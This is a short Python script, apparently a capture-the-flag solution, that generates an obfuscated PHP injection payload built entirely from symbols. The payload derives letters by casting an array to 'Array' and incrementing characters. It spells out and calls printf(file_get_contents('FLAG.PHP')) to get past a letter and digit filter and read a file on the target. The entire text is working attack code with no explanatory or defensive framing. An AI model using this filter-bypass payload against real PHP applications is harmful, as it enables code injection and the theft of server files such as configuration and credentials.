#!/usr/bin/env python

# 'file_get_content("FLAG.PHP.")'

# Array
var1 = '$__=[];$__="$__";$__=$__["+"=="_"];' # $__ == A
var2 = '$___=("_"=="_")+("_"=="_")+("_"=="_");$_=[];$_="$_";$___=$_[$___];' # $__ == a

def get_char(char):
    if char.isupper():
        return '$_=$__;' + '$_++;' * (ord(char) - ord('A'))
    else:
        return '$_=$___;' + '$_++;' * (ord(char) - ord('a'))


def gene_code(var, string):
    r = ''
    for c in string:
        if c.isalpha():
            r += get_char(c) + var + '.=$_;'
        else:
            r += var + '.=' + '"' + c + '"' + ';'
    return r

payload = var1 + var2
payload += gene_code('$____', 'PRINTF')
payload += gene_code('$_____', 'FILE_GET_CONTENTS')
payload += gene_code('$______', 'FLAG.PHP')
payload += '$____($_____($______));'

print(payload)
